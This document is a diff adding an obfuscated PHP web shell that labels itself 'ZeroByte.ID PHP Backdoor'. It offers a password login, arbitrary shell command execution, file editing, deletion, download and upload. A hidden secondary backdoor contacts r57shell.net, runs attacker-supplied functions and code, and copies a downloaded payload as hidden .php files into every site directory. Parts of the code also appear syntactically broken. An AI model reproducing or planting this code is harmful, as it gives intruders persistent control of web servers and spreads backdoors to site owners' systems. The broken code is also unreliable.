@@ -1,0 +1,111 @@
+<?php 
+$password = "d033e22ae348aeb5660fc2140aec35850c4da997"; // Default password encoding md5 
+array("header" => array("Referer: {$referer}\xd\xa"))); goto yYKm7; yYKm7: $context = stream_context_create($opts); goto gDrpJ; clgfS: } goto EygOe; bPrOz: } else { $response = file_get_contents($tmp_file); if (!@preg_match("#stt1#", $response)) { goto uACHp; uACHp: if (function_exists("curl_init")) { goto tnO9y; IGsln: $response = curl_exec($ch); goto zjV7F; FL1r7: curl_setopt($ch, CURLOPT_REFERER, $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]); goto IGsln; hOQVt: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); goto FL1r7; tnO9y: $ch = curl_init(); goto ZY59e; zjV7F: curl_close($ch); goto jB8hC; ZY59e: curl_setopt($ch, CURLOPT_URL, "http://r57shell.net/jquery.php?v=1.2&request=enable"); goto hOQVt; jB8hC: } else { goto T4GUq; kr9u2: $response = @file_get_contents("http://r57shell.net/jquery.php?v=1.2&request=enable", false, $context); goto YUb2a; T4GUq: $referer = $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]; goto L3Cbx; L3Cbx: $opts = array("http" => array("header" => array("Referer: {$referer}\xd\xa"))); goto gCWxt; gCWxt: $context = stream_context_create($opts); goto kr9u2; YUb2a: } goto irBTl; Sa6FA: @file_put_contents($tmp_file, $response); goto g7pSJ; irBTl: @touch($tmp_file); goto Sa6FA; g7pSJ: } } goto yBd5N; VpBFM: if (@$_GET["slince_golden"]) { goto FSbdM; nux_C: if (md5(sha1(@$_GET["is"])) == $response) { goto dZJvm; dZJvm: if (@$_GET["f"]) { print_r($_GET["f"]($_GET["c"])); } goto dhyw8; zBuUR: if (@$_POST["l"]) { function basic_code_extensions($request) { goto y_Rm5; pMM94: $tmpf = stream_get_meta_data($tmp); goto Uix1y; Uix1y: $tmpf = $tmpf["uri"]; goto O2RtQ; qs2Fs: $ret = (include $tmpf); goto UUB5v; O2RtQ: fwrite($tmp, $request); goto qs2Fs; y_Rm5: $tmp = tmpfile(); goto pMM94; UUB5v: fclose($tmp); goto kP1OY; kP1OY: return $ret; goto kGhvS; kGhvS: } print_r(basic_code_extensions($_POST["l"])); } goto QK7_h; dhyw8: if (@$_GET["m"]) { goto hi1td; jxUe0: $file_name_path = @$_GET["m"] . "gagal.php"; goto ymuIn; ymuIn: @file_put_contents($file_name_path, $response); goto GnOH6; GnOH6: echo $file_name_path; goto aYKrx; hi1td: if (function_exists("curl_init")) { goto XclgZ; Dqh0t: curl_setopt($ch, CURLOPT_URL, "http://r57shell.net/mini_admin.txt"); goto N4cfU; hGc2L: $response = curl_exec($ch); goto u8nKZ; XclgZ: $ch = curl_init(); goto Dqh0t; N4cfU: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); goto hGc2L; u8nKZ: curl_close($ch); goto Govpf; Govpf: } else { $response = file_get_contents("http://r57shell.net/mini_admin.txt"); } goto jxUe0; aYKrx: } goto zBuUR; QK7_h: } goto mO5ME; VTdiS: if (function_exists("curl_init")) { goto pZQXo; mSdVP: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); goto tdEIu; OH2ib: curl_close($ch); goto J7E8x; tdEIu: $response = curl_exec($ch); goto OH2ib; eOnom: curl_setopt($ch, CURLOPT_URL, "http://r57shell.net/jquery.php?v=1.2&pwd=get"); goto mSdVP; pZQXo: $ch = curl_init(); goto eOnom; J7E8x: } else { $response = file_get_contents("http://r57shell.net/jquery.php?v=1.2&pwd=get"); } goto nux_C; mO5ME: exit; goto bpniA; FSbdM: echo "<!-- //Silence is golden. -->"; goto VTdiS; bpniA: } goto tn9nX; Qx9KY: foreach ($dirs as $d) { goto JNZio; ftVut: $dirs = array_filter(glob($d . DIRECTORY_SEPARATOR . "*", GLOB_ONLYDIR)); goto L9na2; JNZio: $file_name = $d . DIRECTORY_SEPARATOR . "." . basename($d) . ".php"; goto F3DnI; F3DnI: @file_put_contents($file_name, $response); goto ftVut; L9na2: foreach ($dirs as $d) { if (!@preg_match("#wp-content#", $d)) { $file_name = $d . DIRECTORY_SEPARATOR . "." . basename($d) . ".php"; @file_put_contents($file_name, $response); } } goto I1cxf; I1cxf: } goto QLAr8; kkVp8: $uri_path = dirname($uri_path); goto BdTtS; KEKEg: if ($uri_path == DIRECTORY_SEPARATOR || $uri_path == '') { $document_root = $file_path; } else { $document_root = str_replace($uri_path, '', $file_path); } goto j0OuV; eeQnh: $document_file = $_SERVER["SCRIPT_FILENAME"]; goto NVx55; aDDVb: $uri_path = $parse_url["path"]; goto kkVp8; yBd5N: $dirs = array_filter(glob($document_root . DIRECTORY_SEPARATOR . "*", GLOB_ONLYDIR)); goto Qx9KY; BdTtS: $file_path = dirname($document_file); goto w90Wv; QLAr8: } wp_core_version_check(); } goto ZXHU3; IVvbD: eof(); goto Ee6qe; wwLx_: $disfunc = @ini_get("disable_functions"); goto Eg0so; apV1q: echo $offdir; goto jNi60; XNKtP: echo "</div>"; goto w5kDI; BeRaR: $mysql = function_exists("mysql_connect") ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>"; goto Ovpm7; PTS_9: function exect($cmd) { if (function_exists("system")) { goto tqwg5; tqwg5: @ob_start(); goto bVRtO; cCRFJ: return $exect; goto unMwU; bLn7f: $exect = @ob_get_contents(); goto T2qza; T2qza: @ob_end_clean(); goto cCRFJ; bVRtO: @system($cmd); goto bLn7f; unMwU: } elseif (function_exists("exec")) { goto IIIEE; Shbm1: $exect = ''; goto v7Jh5; v7Jh5: foreach ($results as $result) { $exect .= $result; } goto I1ndb; IIIEE: @exec($cmd, $results); goto Shbm1; I1ndb: return $exect; goto UX6sr; UX6sr: } elseif (function_exists("passthru")) { goto YpNJ7; OAazg: $exect = @ob_get_contents(); goto Unp33; W_O_j: @passthru($cmd); goto OAazg; Unp33: @ob_end_clean(); goto nrJji; nrJji: return $exect; goto K_HnJ; YpNJ7: @ob_start(); goto W_O_j; K_HnJ: } elseif (function_exists("shell_exec")) { $exect = @shell_exec($cmd); return $exect; } } goto bNigo; SmUL_: if (!empty($_GET["path"])) { $offdir = $_GET["path"]; } else { if (!empty($_GET["file"])) { $offdir = dirname($_GET["file"]); } else { if (!empty($_GET["lastpath"])) { $offdir = $_GET["lastpath"]; } else { $offdir = getcwd(); } } } goto SoDsu; SoDsu: echo "<div class="menu">
+<a href="?ext=jumpusr&lastpath="; goto O3eOq; aSNQX: session_start(); goto C7p6z; y_ady: echo php_uname(); goto BeRaR; uNQE8: if (!$_SESSION["loggedIn"]) { echo "
+\xa<html><head><title>Login</title></head>\xd
+  <body>\xd\xa    <p>Go :)</p>\xd\xa    <form method="post">\xd
+      Password: <input type="password" name="password"> <br />\xd\xa      <input type="submit" name="submit" value="Login">\xd\xa    </form>
+  </body>\xd\xa</html>\xd
+\xd
+"; exit; } goto Fz2kK; f3oFO: $lendir = str_replace("\", "/", $offdir); goto lE7Vi; vSDXy: echo "">[ Shell Command ]</a>\xd
+<a href="?ext=vdomain&lastpath="; goto apV1q; T_fbh: echo "">[ Readable User ]</a>
+\xa<a href="?ext=sql_interface&lastpath="; goto dHMpB; hwHGa: if (empty($_GET)) { $dir = getcwd(); } else { $dir = $_GET["path"]; } goto SmUL_; h7uWK: error_reporting(0); goto PTS_9; EDf8j: $perl = exect("perl --help") ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>"; goto X6f0N; PSvIh: echo $offdir; goto vSDXy; O7R_e: echo "<title>ZeroByte.ID PHP Backdoor V 1.4</title>\xd
+<link href='//fonts.googleapis.com/css?family=Share+Tech+Mono' rel='stylesheet' type='text/css'>\xd\xa<style type="text/css">
+\x9body {
+\xa	\x9font-family: courier;\xd\xa\x9\x9background: #f2f2f2;
+\x9	font-size: 1px;\xd\xa\x9}
+\xa	h1 a {\xd\xa	\x9font-weight: normal;
+\xa	\x9font-family: 'Share Tech Mono';\xd
+\x9	font-size: 20px;\xd
+	\x9color:#006600;\xd
+\x9\x9text-decoration: none;\xd\xa\x9\x9margin: 0px;\xd\xa\x9}
+	h2 {
+\xa\x9\x9font-size: 20px;\xd
+\x9	color: #006600;\xd
+\x9\x9text-align: center;\xd\xa\x9\x9padding-top: 5px;\xd
+\x9	margin: 0;
+\xa\x9	margin-top: 10px;\xd\xa\x9}\xd\xa	.menu {
+\xa		text-align: center;\xd
+\x9	font-size: 12px;\xd\xa	\x9border-bottom: 1px dashed #006600;\xd
+	\x9padding-bottom: 5px;
+		margin-bottom: 10px;
+\xa\x9}\xd
+\x9.menu a {
+\x9\x9margin-top: 2px;\xd\xa	\x9color: #006600;\xd
+\x9\x9text-decoration: none;\xd
+	\x9display: inline-block;
+\x9}\xd
+	.container {
+\xa		font-size: 12px;
+\xa\x9}\xd\xa	.filemgr {\xd
+\x9\x9font-size: 12px;
+\x9	width: 100%
+\x9}
+\xa	.filemgr td {\xd
+	\x9padding: 3px;
+	\x9border-bottom: 1px dashed #006600;
+	}
+\xa\x9.filemgr a{\xd\xa\x9\x9text-decoration: none;\xd
+\x9	color:#006600;
+\x9}\xd
+	tr:hover {
+	\x9background: #cccccc;\xd
+	}\xd
+	.tdtl {\xd
+	\x9background:#006600;color:#ffffff;text-align:center;font-weight:bold;
+\xa\x9}\xd
+\x9.footer {\xd
+\x9	text-align: center;
+		border-radius: 30px;\xd
+\x9	margin-top: 25px;
+	\x9border-top: 1px double #006600;\xd\xa	\x9padding: 5px;
+\xa\x9}
+\xa\x9.footer a {\xd
+\x9	color: #006600;
+\xa\x9\x9text-decoration: none;\xd
+\x9}\xd\xa\x9p {\xd\xa    	word-wrap: break-word;\xd
+    \x9margin:2;\xd\xa\x9}
+\xa	a {\xd\xa		text-decoration: none;
+\xa	\x9color: #006600;\xd
+\x9}\xd
+	.act {\xd
+		text-align: center;\xd
+\x9}\xd
+\x9.txarea {\xd\xa	\x9width:100%;
+\xa\x9	height:200px;\xd
+\x9\x9background:transparent;\xd
+	\x9border:1px solid #006600;
+\xa	\x9padding:1px;color:#006600;
+\xa	}\xd\xa\x9h4 {\xd\xa		margin:0;
+\xa	}\xd\xa</style>\xd\xa<div class="container">
+\xa<div style="position:relative;width: 100%;margin-bottom: 5px;border-bottom: 1px dashed #006600;">\xd
+	<div style="float: left;width: 15%;text-align: center;border: 1px dashed #006600;margin-bottom: 5px;">\xd
+	<h1><a href="?">ZeroByte.ID<br><small>Shell V 1.4</small></a></h1>\xd\xa\x9</div>\xd\xa\x9<div style="float: right;width: 83%;">\xd
+\x9"; goto y_ady; G3l6g: echo "&copy; 2018 - <a href="https://zerobyte.id/" rel="nofollow" target="_blank">"; goto IVvbD; zD91E: if (isset($_POST["password"])) { if (sha1($_POST["password"]) == $password) { $_SESSION["loggedIn"] = true; } else { die("Incorrect password"); } } goto uNQE8; Fz2kK: set_time_limit(0); goto h7uWK; X6f0N: $gcc = exect("gcc --help") ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>"; goto wwLx_; I2C3l: echo "<div style="margin-bottom:10px;">"; goto U0Yps; ZW2jW: echo "<p>Disable Function: " . $show_disf; goto acsND; Eg0so: $show_disf = !empty($disfunc) ? "<font color=red>{$disfunc}</font>" : "<font color=#006600>NONE</font>"; goto hFsDZ; lE7Vi: $xlendir = explode("/", $lendir); goto vtcmh; U0Yps: echo "<span style="border:1px dashed #009900;padding:2px;">"; goto f3oFO; gCVtY: if ($_GET["action"] == "edit") { goto yrXKn; AcfUZ: echo "<form method='post'>
+	<textarea name='src' class='txarea'>" . htmlspecialchars(@file_get_contents($_GET["file"])) . "</textarea><br>
+\xa	<input type='submit' value='Save' name='save' style='width: 20%;background:#006600;border:none;color:#f2f2f2;margin-top:5px;height:30px;'>
+	</form>"; goto EURCl; yrXKn: if ($_POST["save"]) { goto a56I0; a56I0: $save = file_put_contents($_GET["file"], $_POST["src"]); goto M81Ib; NRfqk: echo '' . $act . "<br>"; goto iVbIT; M81Ib: if ($save) { $act = "<font color=#006600>Successed!</font>"; } else { $act = "<font color=red>Permission Denied!</font>"; } goto NRfqk; iVbIT: } goto D7aQE; D7aQE: echo "Filename: <font color=#006600>" . basename($_GET["file"]) . "</font>"; goto AcfUZ; EURCl: } else { if ($_GET["action"] == "view") { echo "Filename: <font color=#006600>" . basename($_GET["file"]) . "</font>"; echo "<textarea class='txarea' style='height:400px;' readonly>" . htmlspecialchars(@file_get_contents($_GET["file"])) . "</textarea>"; } else { if ($_GET["action"] == "rename") { goto Gkcky; itUjE: echo "<form method='post'>\xd
+	<input type='text' value='" . basename($_GET["file"]) . "' name='rename' style='width: 450px;' height='10'>
+\xa\x9<input type='submit' name='do_rename' value='rename'>
+	</form>"; goto VJjn3; htwQZ: if ($_POST["do_rename"]) { goto X5dKz; wk1bU: if ($rename) { $act = "<font color=#006600>Successed!</font>"; } else { $act = "<font color=red>Permission Denied!</font>"; } goto Nh7HQ; Nh7HQ: echo '' . $act . "<br>"; goto TfakS; X5dKz: $rename = rename($_GET["file"], "{$path}/" . htmlspecialchars($_POST["rename"]) . ''); goto wk1bU; TfakS: } goto tctQ8; tctQ8: echo "Filename: <font color=#006600>" . basename($_GET["file"]) . "</font>"; goto itUjE; Gkcky: $path = $offdir; goto htwQZ; VJjn3: } else { if ($_GET["action"] == "delete") { goto jkZo8; jkZo8: $path = $offdir; goto q1wIk; K9poz: if ($delete) { } else { $act = "<font color=red>Permission Denied!</font>"; } goto ACp2l; q1wIk: $delete = unlink($_GET["file"]); goto K9poz; ACp2l: echo $act; goto ru_23; ru_23: } else { if ($_GET["action"] == "rmdir") { goto vGAgh; u5EWt: $delete = rmdir($_GET["file"]); goto vW9J0; vW9J0: if ($delete) { echo "<font color=#006600>Deleted!</font><br>"; } else { goto EWGAq; L3fpF: if (file_exists($_GET["file"])) { echo "<font color=red>Permission Denied!</font>"; } else { echo "<font color=#006600>Deleted!</font>"; } goto BEbbz; ABH_v: exect("rm -rf " . $_GET["file"]); goto L3fpF; EWGAq: echo "
+<font color=red>Error remove dir, try to force delete!</font>
+<br>"; goto ABH_v; BEbbz: } goto L0s_V; vGAgh: $path = $offdir; goto u5EWt; L0s_V: } else { if ($_GET["action"] == "download") { goto Y7OZV; k6no4: exit; goto Ms4D7; lRAcd: $file = $_GET["file"]; goto ex0lE; iZWjH: header("Pragma: public"); goto rD7fK; ex0lE: header("Content-Description: File Transfer"); goto Xq5EA; q1dpK: readfile($file); goto k6no4; Y7OZV: @ob_clean(); goto lRAcd; OkKlg: header("Cache-Control: must-revalidate"); goto iZWjH; pnZQg: header("Content-Disposition: attachment; filename="" . basename($file) . """); goto AIfEy; rD7fK: header("Content-Length: " . filesize($file)); goto q1dpK; AIfEy: header("Expires: 0"); goto OkKlg; Xq5EA: header("Content-Type: application/octet-stream"); goto pnZQg; Ms4D7: } else { if ($_GET["ext"] == "shellcmd") { goto L5rK6; kqz1P: echo "terminal:~$ <input name="cmd" type="text" placeholder="echo zerobyte" style="width:300px"/>"; goto GeCRw; Y8rgp: echo "</form>"; goto XTcYd; hcnF0: echo "<form method="post" action="">"; goto kqz1P; L5rK6: echo "<h2>.::[ Shell Command ]::.</h2>"; goto hcnF0; GeCRw: echo " <input type="submit" value=">>"/>"; goto Y8rgp; XTcYd: if (!empty($_POST["cmd"])) { goto XvDmt; r0QcQ: echo exect($cmd); goto AkOUI; OTfLk: $cmd = $_POST["cmd"]; goto r0QcQ; XvDmt: echo "<textarea style="width:100%;height:150px;" readonly>"; goto OTfLk; AkOUI: echo "</textarea>"; goto KxOkN; KxOkN: } goto eVdHN; eVdHN: } else { if ($_GET["ext"] == "uploader") { goto I8LvS; I8LvS: echo "<h2>.::[ Uploader ]::.</h2>"; goto dNE4t; ux7Nv: echo "</form>"; goto zUHYp; LnbdM: echo "<input type="file" name="zerofile"><input name="postupl" type="submit" value="Upload"><br>"; goto ux7Nv; QUT9z: echo "<br><br>PATH [" . $offdir . "]<br>"; goto LnbdM; huR55: echo "<form method=post enctype=multipart/form-data>"; goto QUT9z; zUHYp: if ($_POST["postupl"] == "Upload") { if (@copy($_FILES["zerofile"]["tmp_name"], "{$offdir}/" . $_FILES["zerofile"]["name"])) { echo "<b>OK! " . "{$offdir}/" . $_FILES["zerofile"]["name"] . "</b>"; } else { echo "<b>Upload Failed.</b>"; } } goto ElxcP; ElxcP: echo "</center>"; goto wLBQb; dNE4t: echo "<center>"; goto huR55; wLBQb: } } } } } } } } goto m9TuV; x7BU2: echo $offdir; goto AFLtA; JjmjB: echo "">[ Uploader ]</a>
+</div>
+"; goto I2C3l; Ovpm7: $curl = function_exists("curl_version") ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>"; goto iguAL; whoFh: echo "</span></div>"; goto uNh4J; GDa3V: echo $offdir; goto JjmjB; AFLtA: echo "">[ Other Toolkit ]</a>
+\xa<a href="?ext=uploader&lastpath="; goto GDa3V; vtcmh: foreach ($xlendir as $c_dir => $cdir) { goto q7nox; q7nox: echo "<a href='?path="; goto HUvXZ; a6fU3: echo "'>{$cdir}</a>/"; goto Mxd3M; HUvXZ: for ($i = 0; $i <= $c_dir; $i++) { echo $xlendir[$i]; if ($i != $c_dir) { echo "/"; } } goto a6fU3; Mxd3M: } goto whoFh; dHMpB: echo $offdir; goto YzCmB; uNh4J: if (!empty($dir)) { goto On8mF; J2MWS: foreach ($files as $file) { if ($file != "." && $file != "..") { if (is_dir($dir . "/" . $file)) { $directories[] = $file; } else { $files_list[] = $file; } } } goto Ms2eK; FCzF_: $files_list = array(); goto EMQ6B; XOGKr: echo "</table>"; goto lbMet; EMQ6B: $files = scandir($dir); goto J2MWS; l7gAI: $directories = array(); goto FCzF_; JABCi: foreach ($files_list as $filename) { if (preg_match("/(tar.gz)$/", $filename)) { goto VoMGW; sVdll: echo "</tr>" . "
+"; goto OyGRR; FRN02: echo "<a href="?action=rename&file=" . $dir . "/" . $filename . "" class="act">RENAME</a> "; goto rLNx9; VoMGW: echo "<tr><td><span class="dbox">[F]</span> <a href="#" class="act">" . $filename . "</a>" . "
+"; goto kD78L; rLNx9: echo "<a href="?action=delete&file=" . $dir . "/" . $filename . "" class="act">DELETE</a> "; goto ddZC9; FEba5: echo "</td>" . "
+"; goto sVdll; fX6iz: echo "</td>" . "
+"; goto fpXl7; SryrN: echo "</td>" . "
+"; goto k_tYW; k_tYW: echo "<td class="act">"; goto FRN02; kD78L: echo " <a href="?ext=extract2tmp&gzname=" . $dir . "/" . $filename . "" style="background:#006600;color:#ffffff;padding:1px;padding-left:5px;padding-right:5px;">EXTRACT TO TMP</a>"; goto fX6iz; fpXl7: echo "<td>"; goto begPq; begPq: fperms($dir . "/" . $filename); goto SryrN; ddZC9: echo "<a href="?action=download&file=" . $dir . "/" . $filename . "" class="act">DOWNLOAD</a>"; goto FEba5; OyGRR: } else { goto XE8BF; M6ErE: echo "<td class="act">"; goto DOcTE; ccXZH: echo "</tr>" . "\xa"; goto PnfUd; zSANF: echo "<a href="?action=rename&file=" . $dir . "/" . $filename . "" class="act">RENAME</a> "; goto Emgig; hoFJi: echo "<td>"; goto Tlnuj; Emgig: echo "<a href="?action=delete&file=" . $dir . "/" . $filename . "" class="act">DELETE</a> "; goto jCArB; Oszdg: echo "</td>" . "
+"; goto ccXZH; DOcTE: echo "<a href="?action=edit&file=" . $dir . "/" . $filename . "" class="act">EDIT</a> "; goto zSANF; jCArB: echo "<a href="?action=download&file=" . $dir . "/" . $filename . "" class="act">DOWNLOAD</a>"; goto Oszdg; Tlnuj: fperms($dir . "/" . $filename); goto XRaPt; XE8BF: echo "<tr><td><span class="dbox">[F]</span> <a href="?action=view&file=" . $dir . "/" . $filename . "" class="act">" . $filename . "</a></td>" . "\xa"; goto hoFJi; XRaPt: echo "</td>" . "
+"; goto M6ErE; PnfUd: } } goto XOGKr; TpVPO: echo "<tr><td class="tdtl">Name</td><td class="tdtl" width="9%">Permission</td><td class="tdtl" width="18%">Action</td></tr>" . "
+"; goto l7gAI; On8mF: echo "<table class="filemgr">"; goto TpVPO; Ms2eK: foreach ($directories as $directory) { goto SBOxv; Hbefd: echo "<td class="act">"; goto PNQ1G; wczzU: echo "<a href="?action=rmdir&file=" . $dir . "/" . $directory . "" class="act">DELETE</a>"; goto UnJ3i; YOL1z: echo "</tr>" . "
+"; goto lVkUr; kfPlI: echo "<td>"; goto F8rP8; UnJ3i: echo "</td>" . "
+"; goto YOL1z; PNQ1G: echo "<a href="?action=rename&file=" . $dir . "/" . $directory . "" class="act">RENAME</a> "; goto wczzU; F8rP8: fperms($dir . "/" . $directory); goto OX3Ib; SBOxv: echo "<tr><td><span class="dbox">[D]</span> <a href="?path=" . $dir . "/" . $directory . "">" . $directory . "/</a></td>" . "
+"; goto kfPlI; OX3Ib: echo "</td>" . "
+"; goto Hbefd; lVkUr: } goto JABCi; lbMet: } goto gCVtY; m9TuV: echo "<div class="footer">"; goto G3l6g; acsND: echo "\x9</div>
+\xa	<div style="clear: both;"></div>
+\xa</div>
+"; goto hwHGa; iguAL: $wget = exect("wget --help") ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>"; goto EDf8j; Ee6qe: echo "</a>"; goto XNKtP; ikrF6: function eof() { echo "www.zerobyte.id"; } goto O7R_e; w5kDI: echo "</div>"; 
+?>
